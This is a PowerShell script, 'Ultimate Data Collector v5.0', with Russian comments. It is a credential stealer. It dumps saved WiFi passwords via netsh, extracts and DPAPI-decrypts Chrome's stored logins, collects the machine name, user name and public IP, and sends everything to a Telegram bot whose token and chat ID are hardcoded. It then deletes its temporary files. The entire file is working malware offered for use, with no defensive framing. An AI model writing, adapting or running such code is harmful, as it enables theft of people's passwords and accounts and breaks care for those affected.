<#
.SYNOPSIS
    Ultimate Data Collector v5.0
.DESCRIPTION
    Собирает и отправляет реальные данные: пароли WiFi, логины/пароли из браузеров
#>

$BOT_TOKEN = "6942623726:AAH6yXcm9EgAhbUVxCmphZF3o6H8XScPOFw"
$CHAT_ID = "6525689863"
$TEMP_DIR = "$env:TEMP\DC_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
New-Item -Path $TEMP_DIR -ItemType Directory -Force | Out-Null

function Send-ToTelegram {
    param([string]$Text)
    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
    $body = @{ chat_id = $CHAT_ID; text = $Text }
    try {
        Invoke-RestMethod -Uri $url -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json" -TimeoutSec 10
    } catch { Write-Output "[!] Telegram error: $_" }
}

function Get-WiFiPasswords {
    $output = @()
    try {
        $profiles = (netsh wlan show profiles) | Where-Object { $_ -match "All User Profile" } | ForEach-Object {
            $_.Split(":")[1].Trim()
        }

        foreach ($profile in $profiles) {
            try {
                $profileInfo = netsh wlan show profile name="`"$profile`"" key=clear
                $password = ($profileInfo | Select-String "Key Content").Line.Split(":")[1].Trim()
                $output += "📶 WiFi: $profile"
                $output += "🔑 Пароль: $password"
                $output += "----------------"
            } catch {
                $output += "Ошибка с профилем: $profile"
            }
        }
    } catch {
        $output += "Ошибка при получении WiFi паролей"
    }
    return $output -join "`n"
}

function Get-ChromeCredentials {
    $output = @()
    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    
    if (Test-Path $chromePath) {
        try {
            $tempCopy = "$TEMP_DIR\ChromeLoginData"
            Copy-Item $chromePath $tempCopy -Force

            # Используем SQLite для извлечения данных
            Add-Type -Path "$PSScriptRoot\System.Data.SQLite.dll"
            $conn = New-Object -TypeName System.Data.SQLite.SQLiteConnection
            $conn.ConnectionString = "Data Source=$tempCopy"
            $conn.Open()

            $command = $conn.CreateCommand()
            $command.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
            $reader = $command.ExecuteReader()

            while ($reader.Read()) {
                $output += "🌐 Сайт: $($reader.GetString(0))"
                $output += "👤 Логин: $($reader.GetString(1))"
                
                # Дешифровка пароля Chrome
                $encryptedBytes = $reader.GetValue(2)
                $password = [System.Text.Encoding]::UTF8.GetString(
                    [System.Security.Cryptography.ProtectedData]::Unprotect(
                        $encryptedBytes,
                        $null,
                        [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                    )
                )
                $output += "🔑 Пароль: $password"
                $output += "----------------"
            }
            $conn.Close()
        } catch {
            $output += "Ошибка при чтении данных Chrome: $_"
        }
    }
    return $output -join "`n"
}

# Основной сбор данных
try {
    $report = @()
    
    # 1. Собираем WiFi пароли
    $wifiData = Get-WiFiPasswords
    if ($wifiData) {
        Send-ToTelegram -Text "=== WiFi ПАРОЛИ ===`n$wifiData"
    }

    # 2. Собираем данные Chrome
    $chromeData = Get-ChromeCredentials
    if ($chromeData) {
        Send-ToTelegram -Text "=== CHROME ДАННЫЕ ===`n$chromeData"
    }

    # 3. Отправляем системную информацию
    $sysInfo = @(
        "=== СИСТЕМНАЯ ИНФОРМАЦИЯ ===",
        "💻 Компьютер: $env:COMPUTERNAME",
        "👤 Пользователь: $env:USERNAME",
        "🌐 IP: $(try {(Invoke-WebRequest -Uri 'https://api.ipify.org').Content} catch {'Не определен'})"
    ) -join "`n"
    
    Send-ToTelegram -Text $sysInfo

} catch {
    Send-ToTelegram -Text "❌ Ошибка: $_"
} finally {
    Remove-Item -Path $TEMP_DIR -Recurse -Force -ErrorAction SilentlyContinue
}
